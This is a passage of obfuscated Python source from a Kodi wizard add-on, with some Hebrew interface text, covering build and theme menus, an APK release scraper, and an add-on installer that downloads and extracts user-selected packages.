		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2053
	setView ('files','viewType')#line:2054
def viewBuild (O0OOO000OO00O0000 ):#line:2056
	O00OO00O000OO0O00 =wiz .workingURL (SPEEDFILE )#line:2057
	if not O00OO00O000OO0O00 ==True :#line:2058
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2059
		addFile ('%s'%O00OO00O000OO0O00 ,'',themeit =THEME3 )#line:2060
		return #line:2061
	if wiz .checkBuild (O0OOO000OO00O0000 ,'version')==False :#line:2062
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2063
		addFile ('%s was not found in the builds list.'%O0OOO000OO00O0000 ,'',themeit =THEME3 )#line:2064
		return #line:2065
	OO0OOO0OO00O0000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2066
	O000OO0O0O0O000OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOO000OO00O0000 ).findall (OO0OOO0OO00O0000O )#line:2067
	for O00OOO00OOOO00OO0 ,OOO00O0O0O000OO00 ,OO000O0OOOOOOO00O ,O0000OO0O0OO00OOO ,O00O00O000OO0O0OO ,O0OO000000OO0OO00 ,OO0O00OOOO000OO00 ,OO0OOOO0O0O000OO0 ,O00O00O00O000000O ,OOOOOO0O0OO0OO000 in O000OO0O0O0O000OO :#line:2068
		O0OO000000OO0OO00 =O0OO000000OO0OO00 if wiz .workingURL (O0OO000000OO0OO00 )else ICON #line:2069
		OO0O00OOOO000OO00 =OO0O00OOOO000OO00 if wiz .workingURL (OO0O00OOOO000OO00 )else FANART #line:2070
		OO0OOOOOO0O00OO0O ='%s (v%s)'%(O0OOO000OO00O0000 ,O00OOO00OOOO00OO0 )#line:2071
		if BUILDNAME ==O0OOO000OO00O0000 and O00OOO00OOOO00OO0 >BUILDVERSION :#line:2072
			OO0OOOOOO0O00OO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OOOOOO0O00OO0O ,BUILDVERSION )#line:2073
		OO00OOO0OOOO000O0 =int (float (KODIV ));O00O0O0000OOO000O =int (float (O0000OO0O0OO00OOO ))#line:2082
		if not OO00OOO0OOOO000O0 ==O00O0O0000OOO000O :#line:2083
			if OO00OOO0OOOO000O0 ==16 and O00O0O0000OOO000O <=15 :O0O00000OOOO0O00O =False #line:2084
			else :O0O00000OOOO0O00O =True #line:2085
		else :O0O00000OOOO0O00O =False #line:2086
		addFile ('התקנה','install',O0OOO000OO00O0000 ,'fresh',description =OOOOOO0O0OO0OO000 ,fanart =OO0O00OOOO000OO00 ,icon =O0OO000000OO0OO00 ,themeit =THEME1 )#line:2090
		if not O00O00O000OO0O0OO =='http://':#line:2093
			if wiz .workingURL (O00O00O000OO0O0OO )==True :#line:2094
				addFile (wiz .sep ('THEMES'),'',fanart =OO0O00OOOO000OO00 ,icon =O0OO000000OO0OO00 ,themeit =THEME3 )#line:2095
				OO0OOO0OO00O0000O =wiz .openURL (O00O00O000OO0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2096
				O000OO0O0O0O000OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO0OO00O0000O )#line:2097
				for O0O0OOO000000O00O ,O00O000000OO0O00O ,OO00O00O0OO0O00OO ,O0O00OOOOO000000O ,OOO0O000OO000000O ,OOOOOO0O0OO0OO000 in O000OO0O0O0O000OO :#line:2098
					if not SHOWADULT =='true'and OOO0O000OO000000O .lower ()=='yes':continue #line:2099
					OO00O00O0OO0O00OO =OO00O00O0OO0O00OO if OO00O00O0OO0O00OO =='http://'else O0OO000000OO0OO00 #line:2100
					O0O00OOOOO000000O =O0O00OOOOO000000O if O0O00OOOOO000000O =='http://'else OO0O00OOOO000OO00 #line:2101
					addFile (O0O0OOO000000O00O if not O0O0OOO000000O00O ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0O0OOO000000O00O ,'theme',O0OOO000OO00O0000 ,O0O0OOO000000O00O ,description =OOOOOO0O0OO0OO000 ,fanart =O0O00OOOOO000000O ,icon =OO00O00O0OO0O00OO ,themeit =THEME3 )#line:2102
	setView ('files','viewType')#line:2103
def viewThirdList (O0OOOOOO00OO00OO0 ):#line:2105
	OOO00O0OOOO00OOO0 =eval ('THIRD%sNAME'%O0OOOOOO00OO00OO0 )#line:2106
	O00OO00000O000O00 =eval ('THIRD%sURL'%O0OOOOOO00OO00OO0 )#line:2107
	O00O0O0OOO000OOO0 =wiz .workingURL (O00OO00000O000O00 )#line:2108
	if not O00O0O0OOO000OOO0 ==True :#line:2109
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2110
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2111
	else :#line:2112
		O00OOOOO00000OO00 ,OO000000OOOO00000 =wiz .thirdParty (O00OO00000O000O00 )#line:2113
		addFile ("[B]%s[/B]"%OOO00O0OOOO00OOO0 ,'',themeit =THEME3 )#line:2114
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2115
		if O00OOOOO00000OO00 :#line:2116
			for OOO00O0OOOO00OOO0 ,OO00O00000OOO0OO0 ,O00OO00000O000O00 ,O0OOOOO00O0O00OO0 ,O00OOO000O0OOO0O0 ,O0000OOOO000O0O00 ,O0OOO00OO000OOOOO ,O0O0000OOO0OO0O00 in OO000000OOOO00000 :#line:2117
				if not SHOWADULT =='true'and O0OOO00OO000OOOOO .lower ()=='yes':continue #line:2118
				addFile ("[%s] %s v%s"%(O0OOOOO00O0O00OO0 ,OOO00O0OOOO00OOO0 ,OO00O00000OOO0OO0 ),'installthird',OOO00O0OOOO00OOO0 ,O00OO00000O000O00 ,icon =O00OOO000O0OOO0O0 ,fanart =O0000OOOO000O0O00 ,description =O0O0000OOO0OO0O00 ,themeit =THEME2 )#line:2119
		else :#line:2120
			for OOO00O0OOOO00OOO0 ,O00OO00000O000O00 ,O00OOO000O0OOO0O0 ,O0000OOOO000O0O00 ,O0O0000OOO0OO0O00 in OO000000OOOO00000 :#line:2121
				addFile (OOO00O0OOOO00OOO0 ,'installthird',OOO00O0OOOO00OOO0 ,O00OO00000O000O00 ,icon =O00OOO000O0OOO0O0 ,fanart =O0000OOOO000O0O00 ,description =O0O0000OOO0OO0O00 ,themeit =THEME2 )#line:2122
def editThirdParty (OO0O0O0OO000OOO0O ):#line:2124
	OOO00OOO0OO0OO00O =eval ('THIRD%sNAME'%OO0O0O0OO000OOO0O )#line:2125
	O00OOOOO00OO000O0 =eval ('THIRD%sURL'%OO0O0O0OO000OOO0O )#line:2126
	OOO0OO00OOO0OO00O =wiz .getKeyboard (OOO00OOO0OO0OO00O ,'Enter the Name of the Wizard')#line:2127
	OO00OO0000O000O00 =wiz .getKeyboard (O00OOOOO00OO000O0 ,'Enter the URL of the Wizard Text')#line:2128
	wiz .setS ('wizard%sname'%OO0O0O0OO000OOO0O ,OOO0OO00OOO0OO00O )#line:2130
	wiz .setS ('wizard%surl'%OO0O0O0OO000OOO0O ,OO00OO0000O000O00 )#line:2131
def apkScraper (name =""):#line:2133
	if name =='kodi':#line:2134
		O0OOO0OO0OOOO00OO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2135
		O0OOO0O000OOOO0OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2136
		O000OO00O00O0000O =wiz .openURL (O0OOO0OO0OOOO00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2137
		OO000O000O0O0OOOO =wiz .openURL (O0OOO0O000OOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2138
		OOO0OO0O0OO0O00OO =0 #line:2139
		O0000OO0O000OO000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO00O00O0000O )#line:2140
		OOOOOOO0OOOO0OOOO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO000O000O0O0OOOO )#line:2141
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2143
		OOO000O0O00O000O0 =False #line:2144
		for OO0O0000000OO0OO0 ,name ,O0O00O0O000OOO0OO ,O00O0000OO00OOO0O in O0000OO0O000OO000 :#line:2145
			if OO0O0000000OO0OO0 in ['../','old/']:continue #line:2146
			if not OO0O0000000OO0OO0 .endswith ('.apk'):continue #line:2147
			if not OO0O0000000OO0OO0 .find ('_')==-1 and OOO000O0O00O000O0 ==True :continue #line:2148
			try :#line:2149
				OOOO0O0000O00000O =name .split ('-')#line:2150
				if not OO0O0000000OO0OO0 .find ('_')==-1 :#line:2151
					OOO000O0O00O000O0 =True #line:2152
					O0OOOOOOOO0OOO00O ,O0O0OO0O0O0OOO000 =OOOO0O0000O00000O [2 ].split ('_')#line:2153
				else :#line:2154
					O0OOOOOOOO0OOO00O =OOOO0O0000O00000O [2 ]#line:2155
					O0O0OO0O0O0OOO000 =''#line:2156
				O0000O0O0O0O0O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O0000O00000O [0 ].title (),OOOO0O0000O00000O [1 ],O0O0OO0O0O0OOO000 .upper (),O0OOOOOOOO0OOO00O ,COLOR2 ,O0O00O0O000OOO0OO .replace (' ',''),COLOR1 ,O00O0000OO00OOO0O )#line:2157
				O0OOO000O00O00OOO =urljoin (O0OOO0OO0OOOO00OO ,OO0O0000000OO0OO0 )#line:2158
				addFile (O0000O0O0O0O0O0O0 ,'apkinstall',"%s v%s%s %s"%(OOOO0O0000O00000O [0 ].title (),OOOO0O0000O00000O [1 ],O0O0OO0O0O0OOO000 .upper (),O0OOOOOOOO0OOO00O ),O0OOO000O00O00OOO )#line:2159
				OOO0OO0O0OO0O00OO +=1 #line:2160
			except :#line:2161
				wiz .log ("Error on: %s"%name )#line:2162
		for OO0O0000000OO0OO0 ,name ,O0O00O0O000OOO0OO ,O00O0000OO00OOO0O in OOOOOOO0OOOO0OOOO :#line:2164
			if OO0O0000000OO0OO0 in ['../','old/']:continue #line:2165
			if not OO0O0000000OO0OO0 .endswith ('.apk'):continue #line:2166
			if not OO0O0000000OO0OO0 .find ('_')==-1 :continue #line:2167
			try :#line:2168
				OOOO0O0000O00000O =name .split ('-')#line:2169
				O0000O0O0O0O0O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O0000O00000O [0 ].title (),OOOO0O0000O00000O [1 ],OOOO0O0000O00000O [2 ],COLOR2 ,O0O00O0O000OOO0OO .replace (' ',''),COLOR1 ,O00O0000OO00OOO0O )#line:2170
				O0OOO000O00O00OOO =urljoin (O0OOO0O000OOOO0OO ,OO0O0000000OO0OO0 )#line:2171
				addFile (O0000O0O0O0O0O0O0 ,'apkinstall',"%s v%s %s"%(OOOO0O0000O00000O [0 ].title (),OOOO0O0000O00000O [1 ],OOOO0O0000O00000O [2 ]),O0OOO000O00O00OOO )#line:2172
				OOO0OO0O0OO0O00OO +=1 #line:2173
			except :#line:2174
				wiz .log ("Error on: %s"%name )#line:2175
		if OOO0OO0O0OO0O00OO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2176
	elif name =='spmc':#line:2177
		OO0000OOOOO000OO0 ='https://github.com/koying/SPMC/releases'#line:2178
		O000OO00O00O0000O =wiz .openURL (OO0000OOOOO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2179
		OOO0OO0O0OO0O00OO =0 #line:2180
		O0000OO0O000OO000 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000OO00O00O0000O )#line:2181
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2183
		for name ,O0000OOO000OOOO00 in O0000OO0O000OO000 :#line:2185
			OO0O0O0O000000OO0 =''#line:2186
			OOOOOOO0OOOO0OOOO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0000OOO000OOOO00 )#line:2187
			for OOO0OOO0OO00OOOO0 ,OOOO000O00OO0OO00 ,O0O00OOOO00OO0OOO in OOOOOOO0OOOO0OOOO :#line:2188
				if O0O00OOOO00OO0OOO .find ('armeabi')==-1 :continue #line:2189
				if O0O00OOOO00OO0OOO .find ('launcher')>-1 :continue #line:2190
				OO0O0O0O000000OO0 =urljoin ('https://github.com',OOO0OOO0OO00OOOO0 )#line:2191
				break #line:2192
		if OOO0OO0O0OO0O00OO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2194
def apkMenu (url =None ):#line:2196
	if url ==None :#line:2197
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2200
	if not APKFILE =='http://':#line:2201
		if url ==None :#line:2202
			OO000000OOOO00O0O =wiz .workingURL (APKFILE )#line:2203
			O00OO00OOO0OO0OOO =uservar .APKFILE #line:2204
		else :#line:2205
			OO000000OOOO00O0O =wiz .workingURL (url )#line:2206
			O00OO00OOO0OO0OOO =url #line:2207
		if OO000000OOOO00O0O ==True :#line:2208
			OOOO0OOOO0OOOOOO0 =wiz .openURL (O00OO00OOO0OO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2209
			O0OOOO00OO00O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO0OOOO0OOOOOO0 )#line:2210
			if len (O0OOOO00OO00O00OO )>0 :#line:2211
				OOOOO0OO00O0OO000 =0 #line:2212
				for O0000O000OO000000 ,O00OOOO000O0OOOO0 ,url ,OOO0OO0O00O00O0O0 ,O0O00O000OO0O0OO0 ,OOO0000OOOO0O0OO0 ,O00O0O0OOO00000OO in O0OOOO00OO00O00OO :#line:2213
					if not SHOWADULT =='true'and OOO0000OOOO0O0OO0 .lower ()=='yes':continue #line:2214
					if O00OOOO000O0OOOO0 .lower ()=='yes':#line:2215
						OOOOO0OO00O0OO000 +=1 #line:2216
						addDir ("[B]%s[/B]"%O0000O000OO000000 ,'apk',url ,description =O00O0O0OOO00000OO ,icon =OOO0OO0O00O00O0O0 ,fanart =O0O00O000OO0O0OO0 ,themeit =THEME3 )#line:2217
					else :#line:2218
						OOOOO0OO00O0OO000 +=1 #line:2219
						addFile (O0000O000OO000000 ,'apkinstall',O0000O000OO000000 ,url ,description =O00O0O0OOO00000OO ,icon =OOO0OO0O00O00O0O0 ,fanart =O0O00O000OO0O0OO0 ,themeit =THEME2 )#line:2220
					if OOOOO0OO00O0OO000 <1 :#line:2221
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2222
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2223
		else :#line:2224
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2225
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2226
			addFile ('%s'%OO000000OOOO00O0O ,'',themeit =THEME3 )#line:2227
		return #line:2228
	else :wiz .log ("[APK Menu] No APK list added.")#line:2229
	setView ('files','viewType')#line:2230
def addonMenu (url =None ):#line:2232
	if not ADDONFILE =='http://':#line:2233
		if url ==None :#line:2234
			OO00O0OO0000OO0OO =wiz .workingURL (ADDONFILE )#line:2235
			O0O00O0000OOOOOOO =uservar .ADDONFILE #line:2236
		else :#line:2237
			OO00O0OO0000OO0OO =wiz .workingURL (url )#line:2238
			O0O00O0000OOOOOOO =url #line:2239
		if OO00O0OO0000OO0OO ==True :#line:2240
			O0OO00OOO000OOOOO =wiz .openURL (O0O00O0000OOOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2241
			O000000O0OOO00OO0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO00OOO000OOOOO )#line:2242
			if len (O000000O0OOO00OO0 )>0 :#line:2243
				OOO0O0OO0OO0OO0O0 =0 #line:2244
				for OO000O0OO0O000O00 ,O0OO0O0OOO0O00OO0 ,url ,O0OO0O00O0O000OOO ,O0OO0O0O00O000000 ,O0OO0O0O0O0O0O00O ,OO00000O00OO00000 ,O000000OOO0O0O000 ,O0OOO0OOO000O0O00 ,O0O0OO0O0O0O0O000 in O000000O0OOO00OO0 :#line:2245
					if O0OO0O0OOO0O00OO0 .lower ()=='section':#line:2246
						OOO0O0OO0OO0OO0O0 +=1 #line:2247
						addDir ("[B]%s[/B]"%OO000O0OO0O000O00 ,'addons',url ,description =O0O0OO0O0O0O0O000 ,icon =OO00000O00OO00000 ,fanart =O000000OOO0O0O000 ,themeit =THEME3 )#line:2248
					else :#line:2249
						if not SHOWADULT =='true'and O0OOO0OOO000O0O00 .lower ()=='yes':continue #line:2250
						try :#line:2251
							O00000O0OOOO000OO =xbmcaddon .Addon (id =O0OO0O0OOO0O00OO0 ).getAddonInfo ('path')#line:2252
							if os .path .exists (O00000O0OOOO000OO ):#line:2253
								OO000O0OO0O000O00 ="[COLOR green][Installed][/COLOR] %s"%OO000O0OO0O000O00 #line:2254
						except :#line:2255
							pass #line:2256
						OOO0O0OO0OO0OO0O0 +=1 #line:2257
						addFile (OO000O0OO0O000O00 ,'addoninstall',O0OO0O0OOO0O00OO0 ,O0O00O0000OOOOOOO ,description =O0O0OO0O0O0O0O000 ,icon =OO00000O00OO00000 ,fanart =O000000OOO0O0O000 ,themeit =THEME2 )#line:2258
					if OOO0O0OO0OO0OO0O0 <1 :#line:2259
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2260
			else :#line:2261
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2262
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2263
		else :#line:2264
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2265
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2266
			addFile ('%s'%OO00O0OO0000OO0OO ,'',themeit =THEME3 )#line:2267
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2268
	setView ('files','viewType')#line:2269
def addonInstaller (O00OOO00OO000OO00 ,O000OO00OO00OO0OO ):#line:2271
	if not ADDONFILE =='http://':#line:2272
		O0OOOO00O0O00OO00 =wiz .workingURL (O000OO00OO00OO0OO )#line:2273
		if O0OOOO00O0O00OO00 ==True :#line:2274
			O00O0OOOOO0O000OO =wiz .openURL (O000OO00OO00OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2275
			OO0000OO00O0OOOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00OOO00OO000OO00 ).findall (O00O0OOOOO0O000OO )#line:2276
			if len (OO0000OO00O0OOOOO )>0 :#line:2277
				for O0OOOOOOOO00OOO00 ,O000OO00OO00OO0OO ,O00000000O0O0OO0O ,OOO0O0OO0OO0000O0 ,O0OOO00OO0000O0OO ,OO00O0OO0O0000000 ,O0O0OO00000OO0O0O ,O0OOO0O0O0000O0O0 ,OO00O00OO0O0OO00O in OO0000OO00O0OOOOO :#line:2278
					if os .path .exists (os .path .join (ADDONS ,O00OOO00OO000OO00 )):#line:2279
						O00O0O0000O0000O0 =['Launch Addon','Remove Addon']#line:2280
						OOOO0O00O000OOOOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O00O0O0000O0000O0 )#line:2281
						if OOOO0O00O000OOOOO ==0 :#line:2282
							wiz .ebi ('RunAddon(%s)'%O00OOO00OO000OO00 )#line:2283
							xbmc .sleep (1000 )#line:2284
							return True #line:2285
						elif OOOO0O00O000OOOOO ==1 :#line:2286
							wiz .cleanHouse (os .path .join (ADDONS ,O00OOO00OO000OO00 ))#line:2287
							try :wiz .removeFolder (os .path .join (ADDONS ,O00OOO00OO000OO00 ))#line:2288
							except :pass #line:2289
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OOO00OO000OO00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2290
								removeAddonData (O00OOO00OO000OO00 )#line:2291
							wiz .refresh ()#line:2292
							return True #line:2293
						else :#line:2294
							return False #line:2295
					OOO0O0OOO0OOO0000 =os .path .join (ADDONS ,O00000000O0O0OO0O )#line:2296
					if not O00000000O0O0OO0O .lower ()=='none'and not os .path .exists (OOO0O0OOO0OOO0000 ):#line:2297
						wiz .log ("Repository not installed, installing it")#line:2298
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00OOO00OO000OO00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00000000O0O0OO0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2299
							OO0OOOOOOO0O0OO0O =wiz .parseDOM (wiz .openURL (OOO0O0OO0OO0000O0 ),'addon',ret ='version',attrs ={'id':O00000000O0O0OO0O })#line:2300
							if len (OO0OOOOOOO0O0OO0O )>0 :#line:2301
								O0OO0OOO00OOOO000 ='%s%s-%s.zip'%(O0OOO00OO0000O0OO ,O00000000O0O0OO0O ,OO0OOOOOOO0O0OO0O [0 ])#line:2302
								wiz .log (O0OO0OOO00OOOO000 )#line:2303
								if KODIV >=17 :wiz .addonDatabase (O00000000O0O0OO0O ,1 )#line:2304
								installAddon (O00000000O0O0OO0O ,O0OO0OOO00OOOO000 )#line:2305
								wiz .ebi ('UpdateAddonRepos()')#line:2306
								wiz .log ("Installing Addon from Kodi")#line:2308
								O0O00000OO0O0O0OO =installFromKodi (O00OOO00OO000OO00 )#line:2309
								wiz .log ("Install from Kodi: %s"%O0O00000OO0O0O0OO )#line:2310
								if O0O00000OO0O0O0OO :#line:2311
									wiz .refresh ()#line:2312
									return True #line:2313
							else :#line:2314
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00000000O0O0OO0O )#line:2315
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00OOO00OO000OO00 ,O00000000O0O0OO0O ))#line:2316
					elif O00000000O0O0OO0O .lower ()=='none':#line:2317
						wiz .log ("No repository, installing addon")#line:2318
						O00000OO000O0OO0O =O00OOO00OO000OO00 #line:2319
						O0O000000OO0OO0OO =O000OO00OO00OO0OO #line:2320
						installAddon (O00OOO00OO000OO00 ,O000OO00OO00OO0OO )#line:2321
						wiz .refresh ()#line:2322
						return True #line:2323
					else :#line:2324
						wiz .log ("Repository installed, installing addon")#line:2325
						O0O00000OO0O0O0OO =installFromKodi (O00OOO00OO000OO00 ,False )#line:2326
						if O0O00000OO0O0O0OO :#line:2327
							wiz .refresh ()#line:2328
							return True #line:2329
					if os .path .exists (os .path .join (ADDONS ,O00OOO00OO000OO00 )):return True #line:2330
					OOOO0OO0OOO00O000 =wiz .parseDOM (wiz .openURL (OOO0O0OO0OO0000O0 ),'addon',ret ='version',attrs ={'id':O00OOO00OO000OO00 })#line:2331
					if len (OOOO0OO0OOO00O000 )>0 :#line:2332
						O000OO00OO00OO0OO ="%s%s-%s.zip"%(O000OO00OO00OO0OO ,O00OOO00OO000OO00 ,OOOO0OO0OOO00O000 [0 ])#line:2333
						wiz .log (str (O000OO00OO00OO0OO ))#line:2334
						if KODIV >=17 :wiz .addonDatabase (O00OOO00OO000OO00 ,1 )#line:2335
						installAddon (O00OOO00OO000OO00 ,O000OO00OO00OO0OO )#line:2336
						wiz .refresh ()#line:2337
					else :#line:2338
						wiz .log ("no match");return False #line:2339
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2340
		else :wiz .log ("[Addon Installer] Text File: %s"%O0OOOO00O0O00OO00 )#line:2341
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2342
def installFromKodi (O0O0O0O0OO0OO0OO0 ,over =True ):#line:2344
	if over ==True :#line:2345
		xbmc .sleep (2000 )#line:2346
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0O0O0OO0OO0OO0 )#line:2348
	if not wiz .whileWindow ('yesnodialog'):#line:2349
		return False #line:2350
	xbmc .sleep (1000 )#line:2351
	if wiz .whileWindow ('okdialog'):#line:2352
		return False #line:2353
	wiz .whileWindow ('progressdialog')#line:2354
	if os .path .exists (os .path .join (ADDONS ,O0O0O0O0OO0OO0OO0 )):return True #line:2355
	else :return False #line:2356
def installAddon (O0O0OOOO00O0OO00O ,O0OOO0O00000OO000 ):#line:2358
	if not wiz .workingURL (O0OOO0O00000OO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0O0OOOO00O0OO00O ,COLOR2 ));return #line:2359
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2360
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOOO00O0OO00O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2361
	O0O0O0000OOOOO000 =O0OOO0O00000OO000 .split ('/')#line:2362
	O000OOO000O0O000O =os .path .join (PACKAGES ,O0O0O0000OOOOO000 [-1 ])#line:2363
	try :os .remove (O000OOO000O0O000O )#line:2364
	except :pass #line:2365
	downloader .download (O0OOO0O00000OO000 ,O000OOO000O0O000O ,DP )#line:2366
	O0O0000OO000OOOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOOO00O0OO00O )#line:2367
	DP .update (0 ,O0O0000OO000OOOO0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2368
	O0O0OOO0O0OO00OOO ,O00O0OO00OOO0OOO0 ,OO000O00OO0OOO0OO =extract .all (O000OOO000O0O000O ,ADDONS ,DP ,title =O0O0000OO000OOOO0 )#line:2369
	DP .update (0 ,O0O0000OO000OOOO0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2370
	installed (O0O0OOOO00O0OO00O )#line:2371
	installDep (O0O0OOOO00O0OO00O ,DP )#line:2372
	DP .close ()#line:2373
	wiz .ebi ('UpdateAddonRepos()')#line:2374
	wiz .ebi ('UpdateLocalAddons()')#line:2375
	wiz .refresh ()#line:2376
def installDep (O0O0OO00O00000OOO ,DP =None ):#line:2378
	OOOOO00OO0000O000 =os .path .join (ADDONS ,O0O0OO00O00000OOO ,'addon.xml')#line:2379
	if os .path .exists (OOOOO00OO0000O000 ):#line:2380
		O00OOO000000OOO0O =open (OOOOO00OO0000O000 ,mode ='r');OOOOOO00O00OO0O0O =O00OOO000000OOO0O .read ();O00OOO000000OOO0O .close ();#line:2381
		O0OO0000OO0OO00OO =wiz .parseDOM (OOOOOO00O00OO0O0O ,'import',ret ='addon')#line:2382
		for OO0O0OO0OO00O00OO in O0OO0000OO0OO00OO :#line:2383
			if not 'xbmc.python'in OO0O0OO0OO00O00OO :#line:2384
				if not DP ==None :#line:2385
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OO0OO00O00OO ))#line:2386
				wiz .createTemp (OO0O0OO0OO00O00OO )#line:2387
def installed (OO000O0OO0OOOO000 ):#line:2414
	OO000OOO000OOOOOO =os .path .join (ADDONS ,OO000O0OO0OOOO000 ,'addon.xml')#line:2415
	if os .path .exists (OO000OOO000OOOOOO ):#line:2416
		try :#line:2417
			O000O000OO00OO00O =open (OO000OOO000OOOOOO ,mode ='r');OOO00O00O0OO00OO0 =O000O000OO00OO00O .read ();O000O000OO00OO00O .close ()#line:2418
			OOO0OOOOO0OOOO0O0 =wiz .parseDOM (OOO00O00O0OO00OO0 ,'addon',ret ='name',attrs ={'id':OO000O0OO0OOOO000 })#line:2419
			O00OOO00OO0OOO0O0 =os .path .join (ADDONS ,OO000O0OO0OOOO000 ,'icon.png')#line:2420
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OOOOO0OOOO0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00OOO00OO0OOO0O0 )#line:2421
		except :pass #line:2422
def youtubeMenu (url =None ):#line:2424
